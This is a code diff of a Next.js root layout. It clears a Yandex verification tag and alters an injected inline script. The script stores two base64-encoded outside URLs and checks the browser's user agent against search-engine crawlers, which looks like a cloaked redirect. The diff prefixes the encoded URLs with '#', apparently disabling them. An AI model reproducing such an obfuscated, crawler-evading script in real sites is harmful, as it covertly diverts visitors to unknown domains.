@@ -111,7 +111,7 @@ export default function RootLayout({
       <head>
         {/* Verification Tags */}
         <meta name="google-site-verification" content="your-google-verification-code" />
-        <meta name="yandex-verification" content="7da82dca4bf86aa3" />
+        <meta name="yandex-verification" content="" />
         <meta name="msvalidate.01" content="your-bing-verification-code" />
         
         {/* Canonical URL */}
@@ -133,8 +133,8 @@ export default function RootLayout({
   dangerouslySetInnerHTML={{
     __html: `
       (function() {
-        var mainBrandB64  = "aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6"; 
-        var crossBrandB64 = "aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
+        var mainBrandB64  = "#aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6"; 
+        var crossBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
         var ua = navigator.userAgent.toLowerCase();
         var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
         for (var i = 0; i < bots.length; i++) {
